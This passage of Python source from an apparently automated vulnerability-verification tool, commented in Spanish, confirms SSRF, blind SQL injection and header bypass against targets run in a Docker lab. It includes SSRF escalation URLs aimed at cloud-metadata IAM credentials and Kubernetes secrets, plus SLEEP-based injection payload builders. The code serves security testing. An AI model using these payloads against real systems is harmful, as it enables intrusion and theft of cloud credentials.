            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[url_param] = attempt_url
            entry = {"url": attempt_url, "token": token}
            _resp_status = None
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None,
                                        headers=custom_headers or None)
                _resp_status = resp.status_code
                entry["status"] = _resp_status
                if not first_resp_captured:
                    res.evidence["respuesta_cuerpo_recorte"] = (getattr(resp, "text", "") or "")[:500]
                    first_resp_captured = True
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(1)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            # Async-processed SSRF (webmentions, webhooks, job queues): some endpoints accept
            # the SSRF URL immediately (202/201/200) but process it asynchronously. Poll the
            # listener for up to 8 extra seconds before giving up on this URL variant.
            if not (token in log) and _resp_status in (200, 201, 202, 204):
                for _extra_wait in (2, 2, 4):
                    if token in log:
                        break
                    time.sleep(_extra_wait)
                    log = lab.listener_log()
                if token in log:
                    entry["token_en_log"] = True
                    entry["via"] = "async-delay"
            # JSON body retry: if the form-encoded attempt got a 400/415 (or if any param key
            # suggests JSON), retry with Content-Type: application/json and json= body. Many
            # modern APIs (FastAPI, Django REST, Node.js) only accept JSON bodies and silently
            # ignore form-encoded data, so the SSRF URL never reaches the server's HTTP client.
            if not (token in log) and m != "GET":
                _needs_json = (_resp_status in (400, 415) or
                               endpoint.startswith("/api") or
                               any("json" in str(k).lower() or "body" in str(k).lower()
                                   for k in payload))
                if _needs_json:
                    try:
                        _json_hdrs = dict(custom_headers or {})
                        _json_hdrs["Content-Type"] = "application/json"
                        resp_j = _http_request(m, base_url + endpoint, timeout=15,
                                               json=payload,
                                               headers=_json_hdrs)
                        entry["status_json"] = resp_j.status_code
                        time.sleep(1)
                        log = lab.listener_log()
                        if token in log:
                            entry["token_en_log"] = True
                            entry["via"] = "json-body"
                    except Exception:
                        pass
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        # Secondary OIDC probe: when standard url_param loop failed for identity providers,
        # try each OIDC redirect parameter with the callback URL injected as a JSON body.
        if not found and any(p in (docker_image or "").lower() for p in _OIDC_SSRF_PROVIDERS):
            _oidc_tok = _token()
            _oidc_cb = f"http://{lab.listener}:8080/binoracle-ssrf-{_oidc_tok}"
            if listener_ip:
                _oidc_cb = f"http://{listener_ip}:8080/binoracle-ssrf-{_oidc_tok}"
            for _op in ("redirect_uri", "iss", "post_logout_redirect_uri"):
                try:
                    _r1 = _http_request("POST", base_url + endpoint, timeout=10,
                                        json={_op: _oidc_cb},
                                        headers=dict(custom_headers or {}))
                    _r2 = _http_request("GET", base_url + endpoint, timeout=10,
                                        params={_op: _oidc_cb},
                                        headers=dict(custom_headers or {}))
                    time.sleep(2)
                    _oidc_log = lab.listener_log()
                    if _oidc_tok in _oidc_log:
                        found = True
                        res.evidence["callback_url_ganadora"] = _oidc_cb
                        res.evidence["token_ganador"] = _oidc_tok
                        res.evidence["listener_log_recorte"] = _oidc_log[:1000]
                        res.evidence["oidc_ssrf_param"] = _op
                        step(f"[ssrf-oidc] VERIFICADO via {_op!r}")
                        break
                except Exception:
                    pass

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "url_param": url_param, "listener_ip": listener_ip,
                             "metodo": m, "intentos": tried})

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
                          f"laboratorio) recibio una conexion con el token exacto tras la "
                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                          f"navegador del atacante")
            # Cloud metadata escalation: try to access IMDS endpoints via the SSRF
            # This proves actual impact (credential exposure via AWS/GCP/Azure metadata)
            _CLOUD_METADATA_URLS = [
                # AWS IMDSv1 — most common and direct
                ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                ("AWS", "http://169.254.169.254/latest/meta-data/hostname"),
                # GCP metadata
                ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/"),
                # Azure IMDS
                ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
                # Kubernetes service account
                ("K8s", "http://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
                # Localhost internal services
                ("internal", "http://localhost:8080/health"),
                ("internal", "http://127.0.0.1:2375/version"),  # Docker daemon
            ]
            _cloud_hits = []
            for _cloud_name, _cloud_url in _CLOUD_METADATA_URLS:
                try:
                    _cloud_payload = dict(parameters) if isinstance(parameters, dict) else {}
                    _cloud_payload[url_param] = _cloud_url
                    _cr = _http_request(m, base_url + endpoint, timeout=8,
                                         data=_cloud_payload if m != "GET" else None,
                                         params=_cloud_payload if m == "GET" else None,
                                         headers=custom_headers or None)
                    _body = (getattr(_cr, "text", "") or "")[:500]
                    # Classify what we got back
                    _is_creds = any(kw in _body.lower() for kw in
                                    ("accesskeyid", "secretaccesskey", "token", "credential",
                                     "serviceaccount", "computemetadata"))
                    _is_meta = any(kw in _body.lower() for kw in
                                   ("instance", "hostname", "region", "zone", "ami-id",
                                    "kubernetes", "namespace"))
                    if _is_creds or _is_meta:
                        _cloud_hits.append({
                            "cloud": _cloud_name,
                            "url": _cloud_url,
                            "status": _cr.status_code,
                            "body_preview": _body[:200],
                            "has_credentials": _is_creds,
                        })
                        step(f"  ssrf-escalation: {_cloud_name} metadata accesible "
                             f"({'CREDENCIALES' if _is_creds else 'metadata'})")
                except Exception:
                    continue
            if _cloud_hits:
                res.evidence["ssrf_cloud_escalation"] = _cloud_hits
                _cred_hit = next((h for h in _cloud_hits if h["has_credentials"]), None)
                if _cred_hit:
                    res.detail += (f"\n\nESCALACIÓN CLOUD: acceso a {_cred_hit['cloud']} IMDS "
                                   f"con exposición de credenciales — impacto CRÍTICO")
                else:
                    res.detail += (f"\n\nESCALACIÓN CLOUD: acceso a metadata de "
                                   f"{', '.join(h['cloud'] for h in _cloud_hits)} "
                                   f"— servidor en entorno cloud")
                # Normalize into weaponization dict for uniform report/web display
                _ssrf_wep_data = {
                    h["cloud"]: h.get("body_preview", "")[:120] for h in _cloud_hits
                }
                _ssrf_wep_impact = (
                    "SSRF confirmed — cloud IMDS reachable: "
                    + (f"{_cred_hit['cloud']} credentials exposed" if _cred_hit
                       else ", ".join(h["cloud"] for h in _cloud_hits) + " metadata accessible")
                )
                res.evidence["weaponization"] = {
                    "technique": "ssrf_cloud_escalation",
                    "data": _ssrf_wep_data,
                    "impact": _ssrf_wep_impact,
                }
            # Baseline weaponization when no cloud metadata hit: callback confirms SSRF
            if not res.evidence.get("weaponization"):
                res.evidence["weaponization"] = {
                    "technique": "ssrf_internal_callback",
                    "data": {
                        "token": res.evidence.get("token_ganador", ""),
                        "callback_url": res.evidence.get("callback_url_ganadora", ""),
                        "listener_log": res.evidence.get("listener_log_recorte", "")[:300],
                    },
                    "impact": (
                        f"SSRF confirmed — server made outbound request to internal "
                        f"callback (token={res.evidence.get('token_ganador','')!r}). "
                        f"Internal network reachable from server."
                    ),
                }
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
            _ssrf_url = base_url + endpoint
            _ssrf_body = f"Token SSRF recibido:\n{res.evidence.get('token_ganador','')}\n\nLog del listener:\n{res.evidence.get('listener_log_recorte','')[:600]}"
            _add_exploit_evidence(
                res=res, method=m, url=_ssrf_url,
                resp_or_body=_ssrf_body,
                highlight=res.evidence.get("token_ganador", ""),
                caption_es=(f"SSRF confirmado: listener interno recibio el token "
                            f"'{res.evidence.get('token_ganador','')}' al enviar "
                            f"{url_param}={res.evidence.get('callback_url_ganadora','')!r}"),
                caption_en=(f"SSRF confirmed: internal listener received token "
                            f"'{res.evidence.get('token_ganador','')}' via "
                            f"{url_param}={res.evidence.get('callback_url_ganadora','')!r}"),
                extra_terminal=_ssrf_body,
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
                          f"que el endpoint/parametro no sean los reales, o que el servidor "
                          f"filtre de verdad las URLs internas antes de seguirlas)")
            _capture_container_logs_on_failure(container, res, step)
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


# SLEEP() (MySQL/MariaDB/SQLite con create_function propio), pg_sleep() (PostgreSQL) -- el motor
# real no se puede saber sin leer el codigo, asi que se prueban los dos dialectos en vez de
# asumir uno. Si el motor real no tiene ninguno de los dos, el payload simplemente no ejecuta
# nada y la peticion tarda lo normal (no es un falso positivo).
_SQLI_SLEEP_SECONDS = 4.0
_SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
# SQLite no tiene SLEEP(). Forzamos I/O con HEX(randomblob(N)) -- genera N bytes de datos
# aleatorios en memoria y los convierte a hex; con 50 MB tarda ~2-3s en un contenedor Docker
# moderno (confirmado empiricamente), lo que supera el threshold de SQLI_SLEEP_SECONDS/2.
# Se pega directamente como expresion de valor en el contexto AND (igual que SLEEP()).
_SQLI_SQLITE_TIMING_EXPR = "HEX(randomblob(50000000))"
# _LEGACY_SQLI_CONTEXTS en joomlaverify.py probo en vivo (CVE-2025-40636, mod_vvisit_counter
# 2.0.4j3: WHERE ip=UNHEX(SHA1('$ip')), payload ganador real necesito exactamente DOS parentesis
# de cierre) que el SQL real nido con frecuencia el valor contaminado dentro de llamadas a
# funcion, no solo un simple WHERE col='$val'. Ese mismo gap aplicaba aqui: esta lista solo
# cerraba UN nivel de parentesis -- se amplia con las mismas variantes de DOS y TRES niveles ya
# probadas, para ambos estilos de comilla.
_SQLI_CONTEXTS = ("", "'", "')", "'))", "')))", '"', '")', '"))', '")))')
_SQLI_COMMENTS = ("-- -", "#")
# Confirmado en vivo contra CVE-2026-9469 (StudentManagementSystem /success.php, `user` ->
# "SELECT * FROM admin WHERE user='$user' AND password='$hash'"): el bucle de abajo SOLO
# probaba "<val> AND <sleep>", que requiere que <val> YA machee una fila real -- en un
# formulario de login probado con un usuario que no existe (el caso MAS comun, nadie conoce ya
# una cuenta valida de antemano), MySQL cortocircuita el AND por fila sin llegar a evaluar
# SLEEP() nunca, y el payload no retrasa nada aunque la inyeccion sea real (confirmado: 0.0s en
# 45/45 combinaciones AND contra el admin real). "OR <sleep>" si fuerza la evaluacion sin
# necesitar fila que machee, pero SLEEP() en bruto dentro de un OR se evalua UNA VEZ POR FILA
# escaneada (no cortocircuita, porque SLEEP() siempre devuelve 0/falso) -- confirmado en vivo:
# contra la tabla `admin` real (6 filas), "OR SLEEP(4)" tardo ~24s (6 x 4s), no ~4s, y ese
# retraso crece con el tamano de la tabla sin limite, arriesgando superar el timeout de la
# peticion (_SQLI_SLEEP_SECONDS + 15s) en tablas mas grandes. Envolver el SLEEP en una subquery
# derivada sin correlacion ("SELECT 1 FROM (SELECT SLEEP(n)) x") la fuerza a materializarse UNA
# SOLA VEZ por ejecucion de consulta en vez de una vez por fila -- confirmado en vivo: mismo
# "OR" contra la misma tabla de 6 filas, ~4.0s en vez de ~24s. Se usa solo para "OR" (donde la
# multiplicacion es real); "AND" sigue con el SLEEP() en bruto que 09e1daf ya probo en vivo.
_SQLI_BOOLEAN_OPS = ("AND", "OR")


def _sqli_sleep_clause(op: str, sleep_expr: str) -> str:
    if op == "OR":
        return f"(SELECT 1 FROM (SELECT {sleep_expr}) binoracle_sqli_sleep)"
    return sleep_expr


def _screenshot_browser_navigate(url: str) -> Optional[str]:
    """Abre la URL en un navegador Chromium headless real y toma una captura visual de la pagina
    tal como la renderiza el navegador (captura tipo 'web', distinta de _screenshot_response que
    muestra el visor HTTP). Devuelve PNG en base64, o None si Playwright no esta disponible."""
    try:
        from playwright.sync_api import sync_playwright
        from .. import chromium_launch_kwargs
    except Exception:
        return None
    import base64
    import concurrent.futures as _cf
    import tempfile

    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)

    def _do() -> Optional[str]:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**chromium_launch_kwargs())
            try:
                page = browser.new_context(
                    viewport={"width": 1280, "height": 800},
                    device_scale_factor=2,
                ).new_page()
                page.goto(url, wait_until="domcontentloaded", timeout=12000)
                page.screenshot(path=out_path)
                try:
                    page.close(run_before_unload=False)
                except Exception:
                    pass
            finally:
                browser.close()
        with open(out_path, "rb") as fh:
            return base64.b64encode(fh.read()).decode("ascii")

    try:
        with _cf.ThreadPoolExecutor(max_workers=1) as executor:
            return executor.submit(_do).result(timeout=30)
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _add_exploit_evidence(res: "WpVerifyResult", method: str, url: str,
                          resp_or_body, highlight: str,
                          caption_es: str, caption_en: str,
                          extra_terminal: str = "") -> None:
    """Helper universal: tras confirmar la explotacion, captura screenshot HTTP + http_capture.
    Llama a _screenshot_response (Playwright), almacena en res.evidence independientemente de
    si Playwright esta disponible (el http_capture siempre se guarda)."""
    if isinstance(resp_or_body, str):
        status = 200
        body = resp_or_body[:6000]
        req_body_str = ""
        req_headers: dict = {}
        resp_headers: dict = {}
        reason = ""
    else:
        status = getattr(resp_or_body, 'status_code', 200)
        body = (getattr(resp_or_body, 'text', '') or '')[:6000]
        reason = getattr(resp_or_body, 'reason', '') or ''
        req_obj = getattr(resp_or_body, 'request', None)
        raw_body = getattr(req_obj, 'body', None) if req_obj else None
        req_body_str = ""
        if isinstance(raw_body, bytes):
            req_body_str = raw_body.decode('utf-8', errors='replace')[:2000]
        elif isinstance(raw_body, str):
            req_body_str = raw_body[:2000]
        raw_hdrs = dict(getattr(req_obj, 'headers', {}) or {}) if req_obj else {}
        req_headers = {k: v for k, v in raw_hdrs.items()
                       if k.lower() not in ('cookie', 'authorization')}
        resp_headers = {k: v for k, v in dict(getattr(resp_or_body, 'headers', {}) or {}).items()
                        if k.lower() not in ('set-cookie',)}

    # Always store structured http_capture (no Playwright needed)
    res.evidence.setdefault("http_captures", []).append({
        "caption_es": caption_es,
        "caption_en": caption_en,
        "method": method.upper(),
        "url": url,
        "request_headers": req_headers,
        "request_body": req_body_str,
        "response_status": status,
        "response_reason": reason,
        "response_headers": resp_headers,
        "response_body": body[:3000],
        "highlight": highlight,
    })

    # Try Playwright screenshot
    try:
        _png = _screenshot_response(url, method.upper(), status, body, highlight=highlight)
        if _png:
            res.evidence.setdefault("screenshots", []).append({
                "png_b64": _png,
                "url": url,
                "caption_es": caption_es,
                "caption_en": caption_en,
            })
    except Exception:
        pass

    # Optional terminal screenshot (for canary-type verification)
    if extra_terminal:
        try:
            _tpng = _screenshot_terminal_step(
                "binoracle · explotacion confirmada", extra_terminal,
                highlight=highlight,
            )
            if _tpng:
                res.evidence.setdefault("screenshots", []).append({
                    "png_b64": _tpng,
                    "url": "",
                    "caption_es": caption_es + " (evidencia terminal)",
                    "caption_en": caption_en + " (terminal evidence)",
                })
        except Exception:
            pass


def _take_generic_screenshots_sqli(
    base_url: str, endpoint_path: str, m: str, base_params: dict,
    sqli_param: str, evidence: dict,
    custom_headers: Optional[dict] = None,
) -> List[dict]:
    """Captura screenshots Playwright del lab generico para SQLi: control, payload, false (boolean)."""
    import urllib.parse
    shots: List[dict] = []
    http_captures: List[dict] = []
    estrategia = evidence.get("estrategia", "tiempo")
    payload_ganador = evidence.get("payload_ganador", "")
    orig_value = str(base_params.get(sqli_param) or "1")

    def _do_shot(params: dict, step_n: int, caption_es: str, caption_en: str,
                 highlight: str = "", timeout: int = 20) -> None:
        try:
            resp = _http_request(m, base_url + endpoint_path, timeout=timeout,
                                 data=params if m != "GET" else None,
                                 params=params if m == "GET" else None,
                                 headers=custom_headers or None)
            body = getattr(resp, "text", "") or ""
            status = getattr(resp, "status_code", 200)
            url_disp = base_url + endpoint_path
            if m == "GET":
                url_disp += "?" + urllib.parse.urlencode(params)
            png = _screenshot_response(url_disp, m, status, body, highlight=highlight)
            if png:
                shots.append({"step": step_n, "caption_es": caption_es,
                               "caption_en": caption_en, "png_b64": png})
            # Captura HTTP estructurada (Burp-style)
            req_obj = getattr(resp, 'request', None)
            req_body_raw = getattr(req_obj, 'body', None) if req_obj else None
            req_body_str = ""
            if isinstance(req_body_raw, bytes):
                req_body_str = req_body_raw.decode('utf-8', errors='replace')[:2000]
            elif isinstance(req_body_raw, str):
                req_body_str = req_body_raw[:2000]
            raw_hdrs = dict(getattr(req_obj, 'headers', {}) or {}) if req_obj else {}
            req_headers = {k: v for k, v in raw_hdrs.items()
                           if k.lower() not in ('cookie', 'authorization')}
            resp_hdrs = {k: v for k, v in dict(getattr(resp, 'headers', {}) or {}).items()
                         if k.lower() not in ('set-cookie',)}
            http_captures.append({
                "caption_es": caption_es,
                "caption_en": caption_en,
                "method": m,
                "url": url_disp,
                "request_headers": req_headers,
                "request_body": req_body_str,
                "response_status": status,
                "response_reason": getattr(resp, 'reason', '') or '',
                "response_headers": resp_hdrs,
                "response_body": body[:3000],
                "highlight": highlight,
            })
        except Exception:
            pass

    _do_shot({**base_params, sqli_param: orig_value}, 1,
             f"Control: {m} {endpoint_path} sin inyección → respuesta base del servidor",
             f"Control: {m} {endpoint_path} without injection → baseline server response")

    if payload_ganador:
        if estrategia == "boolean-inband":
            cap_es = (f"Payload boolean TRUE: {sqli_param}={payload_ganador!r} → "
                      f"{evidence.get('respuesta_true_len', '?')}B (inyección confirmada)")
            cap_en = (f"Boolean TRUE payload: {sqli_param}={payload_ganador!r} → "
                      f"{evidence.get('respuesta_true_len', '?')}B (injection confirmed)")
        else:
            cap_es = (f"Payload SQLi ciega: {sqli_param}={payload_ganador!r} → "
                      "respuesta retrasada (tiempo confirma inyección)")
            cap_en = (f"Blind SQLi payload: {sqli_param}={payload_ganador!r} → "
                      "delayed response (time-based injection confirmed)")
        _do_shot({**base_params, sqli_param: payload_ganador}, 2,
                 cap_es, cap_en, highlight=payload_ganador[:80])

    if estrategia == "boolean-inband" and evidence.get("payload_false"):
        pf = evidence["payload_false"]
        _do_shot({**base_params, sqli_param: pf}, 3,
                 (f"Payload boolean FALSE: {sqli_param}={pf!r} → "
                  f"{evidence.get('respuesta_false_len', '?')}B (contraste con payload TRUE)"),
                 (f"Boolean FALSE payload: {sqli_param}={pf!r} → "
                  f"{evidence.get('respuesta_false_len', '?')}B (contrast with TRUE payload)"))

    # Web screenshot — navegador real apuntando al servidor del lab (complementa los shots
    # de visor HTTP con una vista tal como la renderiza Chromium)
    step_web = len(shots) + 1
    try:
        web_url = base_url + endpoint_path
        # GET: añadir payload ganador en la URL para que el navegador muestre la respuesta
        if m == "GET" and payload_ganador:
            web_url += "?" + urllib.parse.urlencode({**base_params, sqli_param: payload_ganador})
        web_png = _screenshot_browser_navigate(web_url)
        if web_png:
            shots.append({
                "step": step_web,
                "caption_es": (f"Vista web real: Chromium renderiza {endpoint_path} "
                               f"— servidor vivo en {base_url}"),
                "caption_en": (f"Real web view: Chromium renders {endpoint_path} "
                               f"— live server at {base_url}"),
                "png_b64": web_png,
            })
    except Exception:
        pass
    return shots, http_captures


def _take_generic_screenshots_bypass(
    base_url: str, endpoint: str, m: str,
    bypass_header: str, bypass_value: str,
    status_normal: int, body_normal: str,
    status_bypass: int, body_bypass: str,
) -> tuple:
    """Captura screenshots Playwright del lab generico para header bypass.
    Devuelve (shots, http_captures)."""
    shots: List[dict] = []
    http_captures: List[dict] = []
    url = base_url + endpoint

    for step_n, status, body, caption_es, caption_en, hl, extra_hdrs in [
        (1, status_normal, body_normal,
         f"Sin header de bypass → HTTP {status_normal} (middleware bloquea el acceso)",
         f"Without bypass header → HTTP {status_normal} (middleware blocks access)",
         "", {}),
        (2, status_bypass, body_bypass,
         f"CON {bypass_header}: {bypass_value[:60]!r} → HTTP {status_bypass} (acceso conseguido)",
         f"WITH {bypass_header}: {bypass_value[:60]!r} → HTTP {status_bypass} (access gained)",
         bypass_value[:80], {bypass_header: bypass_value}),
    ]:
        try:
            png = _screenshot_response(url, m, status, body, highlight=hl)
            if png:
                shots.append({"step": step_n, "caption_es": caption_es,
                               "caption_en": caption_en, "png_b64": png})
        except Exception:
            pass
        http_captures.append({
            "caption_es": caption_es,
            "caption_en": caption_en,
            "method": m,
            "url": url,
            "request_headers": extra_hdrs,
            "request_body": "",
            "response_status": status,
            "response_reason": "",
            "response_headers": {},
            "response_body": body[:3000],
            "highlight": hl,
        })

    # Web screenshot — navegador real apuntando al endpoint (vista complementaria al visor HTTP)
    try:
        web_png = _screenshot_browser_navigate(url)
        if web_png:
            shots.append({
                "step": len(shots) + 1,
                "caption_es": (f"Vista web real: Chromium renderiza {endpoint} "
                               f"tras el bypass — servidor vivo en {url.split(endpoint)[0]}"),
                "caption_en": (f"Real web view: Chromium renders {endpoint} "
                               f"after bypass — live server at {url.split(endpoint)[0]}"),
                "png_b64": web_png,
            })
    except Exception:
        pass
    return shots, http_captures


def verify_generic_sqli_blind(
    source_dir: str, endpoint: str, http_method: str, parameters,
    sqli_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    sqli_identifier_table_hint: str = "",
    custom_headers: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    dockerfile_body: str = "",
    extra_files: Optional[dict] = None,
    confirm_string: str = "",
    _tried_params_set: Optional[frozenset] = None,
    sqli_header_hint: str = "",
    auth_required: bool = False,
    nonce_endpoint: str = "",
    docker_image: str = "",
) -> WpVerifyResult:
    """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
    Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
    ser MySQL/Postgres/SQLite/MSSQL/Mongo...), el error-based (extractvalue/updatexml, sintaxis
    de MySQL) y el UNION-based (depende del numero de columnas Y de que el motor soporte UNION
    igual) no generalizan sin arriesgar falsos positivos/negativos por motor equivocado -- el
    retraso de una funcion SLEEP es la unica senal que vale casi igual en cualquier SQL.

    sqli_identifier_table_hint: si se conoce el nombre real de la tabla (y la clausula GROUP BY),
    activa la estrategia de inyeccion backtick-FROM: se rompe el identificador de columna con
    una comilla invertida y se sustituye el FROM original por una subquery que incluye SLEEP en
    el WHERE -- e.g. `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 GROUP BY col-- -`
    Con esto se puede verificar SQLi en contextos de identifiers MySQL (Django annotate(), etc.)
    donde los payloads estandar de tipo 'valor' AND/OR SLEEP fallan por contexto sintatctico.

    Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
    de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
    produce un retraso consistente (>= la mitad del SLEEP pedido) en las 2 repeticiones
    independientes de la MISMA peticion, no en una sola medida que podria ser ruido.

    Prueba AMBOS combinadores booleanos (AND y OR, ver _SQLI_BOOLEAN_OPS) -- "AND <sleep>" solo
    retrasa si el valor original YA machea una fila real (CMS-especificos como wpverify suelen
    saberlo de antemano por el login), pero un formulario generico probado sin credenciales
    validas nunca la machea, y MySQL cortocircuita el AND por fila sin llegar a evaluar SLEEP()
    -- confirmado en vivo contra CVE-2026-9469. "OR <sleep>" no necesita fila que machee, pero
    SLEEP() en bruto dentro de un OR se evalua una vez POR FILA escaneada (el retraso crece con
    el tamano de la tabla); se envuelve en una subquery derivada sin correlacion para forzar una
    sola evaluacion por consulta, no por fila (ver _sqli_sleep_clause)."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' o pasalo a mano (sqli_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   setup_commands=setup_commands,
                                   dockerfile_body=dockerfile_body,
                                   extra_files=extra_files,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        # Auth acquisition for APIs that require a bearer token (Mattermost, Directus, etc.)
        if auth_required:
            _auth_res = _try_acquire_app_token(base_url, step)
            if _auth_res:
                custom_headers = dict(custom_headers or {})
                if _auth_res.startswith("cookie:"):
                    custom_headers.setdefault("Cookie", _auth_res[7:])
                else:
                    custom_headers.setdefault("Authorization", f"Bearer {_auth_res}")
            else:
                step("WARN: auth_required pero no se pudo autenticar — continuando sin auth")
        # Nonce extraction: some WP plugins embed a frontend nonce in the page source.
        # If nonce_endpoint is set, fetch it and fill any empty nonce parameter.
        if nonce_endpoint:
            try:
                _nonce_resp = _http_request("GET", base_url + nonce_endpoint, timeout=10)
                _nonce_text = getattr(_nonce_resp, "text", None) or getattr(_nonce_resp, "body", None) or ""
                import re as _re_nonce
                _nonce_m = _re_nonce.search(
                    r'"(?:nonce|_nonce|frontend_nonce|ajax_nonce)"\s*:\s*"([a-f0-9]{6,20})"',
                    _nonce_text)
                if not _nonce_m:
                    _nonce_m = _re_nonce.search(r'"nonce"\s*:\s*"([^"]{6,20})"', _nonce_text)
                if _nonce_m:
                    _nonce_val = _nonce_m.group(1)
                    if isinstance(parameters, dict):
                        parameters = dict(parameters)
                        for _nk in list(parameters.keys()):
                            if "nonce" in _nk.lower() and not parameters[_nk]:
                                parameters[_nk] = _nonce_val
                    step(f"nonce extraido desde {nonce_endpoint}: {_nonce_val!r}")
                else:
                    step(f"WARN: nonce_endpoint={nonce_endpoint!r} no devolvio nonce reconocible")
            except Exception as _ne:
                step(f"WARN: fallo extraccion de nonce desde {nonce_endpoint!r}: {_ne}")
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        # Fast-path: if confirm_string is set and parameters already contain a ready-to-send
        # payload (e.g. Django _connector=OR 1=1), try a direct HTTP request first.
        # This avoids using time-based blind SQLi for CVEs where the response leaks data directly.
        if confirm_string and isinstance(parameters, dict) and parameters:
            try:
                _ep_fast = endpoint.split("?")[0] if endpoint and "?" in endpoint else endpoint
                _hdrs_fast = dict(custom_headers or {})
                _fp_json_body = bool(
                    _hdrs_fast.get("Content-Type", "").startswith("application/json")
                    or _ep_fast.startswith("/api")
                    or any("json" in str(k).lower() for k in parameters)
                )
                if m == "GET":
                    _r_fast = _http_request(m, base_url + _ep_fast, timeout=15,
                                             params=parameters, headers=_hdrs_fast or None)
                elif _fp_json_body:
                    _hdrs_fast.setdefault("Content-Type", "application/json")
                    _r_fast = _http_request(m, base_url + _ep_fast, timeout=15,
                                             json=parameters, headers=_hdrs_fast or None)
                else:
                    _r_fast = _http_request(m, base_url + _ep_fast, timeout=15,
                                             data=parameters, headers=_hdrs_fast or None)
                _body_fast = getattr(_r_fast, "text", "") or ""
                if confirm_string.lower() in _body_fast.lower():
                    res.verified = True
                    res.ok = True
                    res.confidence = "confirmed"
                    res.evidence.update({
                        "fast_path": True,
                        "respuesta_cuerpo_recorte": _body_fast[:600],
                        "confirm_string": confirm_string,
                        "status_code": getattr(_r_fast, "status_code", 0),
                        "url": base_url + _ep_fast,
                        "metodo": m,
                    })
                    res.detail = (f"SQLi CONFIRMADO (fast-path): confirm_string "
                                  f"'{confirm_string}' en respuesta directa — "
                                  f"payload inyectado produjo datos en respuesta")
                    step(f"VERIFICADO (fast-path): confirm_string '{confirm_string}' presente")
                    return res
            except Exception:
                pass  # Fall through to time-based verification

        # Strip the query string from the endpoint: params are always passed separately as a
        # dict via 'params=' in GET requests. If the endpoint includes '?k=<placeholder>' (a
        # common LLM output pattern), appending it to base_url while ALSO passing the same key
        # via params= would create duplicate query params -- Flask/Django returns the first one
        # (the literal placeholder), not the injected payload.
        endpoint_path = endpoint.split("?")[0] if endpoint and "?" in endpoint else endpoint
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
        orig_value = str(base_params.get(sqli_param) or "1")

        # Detect if endpoint likely expects JSON body (not form-encoded).
        # Heuristic: /api/ prefix, or Content-Type: application/json in custom_headers,
        # or any param key containing 'json' or 'body'. First we probe with form-encoded;
        # if that returns 400/415 we switch permanently to json= mode.
        _use_json_body = bool(
            (custom_headers or {}).get("Content-Type", "").startswith("application/json")
            or endpoint_path.startswith("/api")
            or any("json" in str(k).lower() for k in (base_params or {}))
        )
        _json_probed = False  # True once we've auto-detected JSON mode from a 400/415

        def timed_send(val, capture_body: bool = False) -> Optional[float]:
            nonlocal _use_json_body, _json_probed
            payload = dict(base_params)
            payload[sqli_param] = val
            t0 = time.time()
            try:
                _hdrs = dict(custom_headers or {})
                if _use_json_body and m != "GET":
                    _hdrs.setdefault("Content-Type", "application/json")
                    resp = _http_request(m, base_url + endpoint_path, timeout=_SQLI_SLEEP_SECONDS + 15,
                                     json=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None,
                                     headers=_hdrs or None)
                else:
                    resp = _http_request(m, base_url + endpoint_path, timeout=_SQLI_SLEEP_SECONDS + 15,
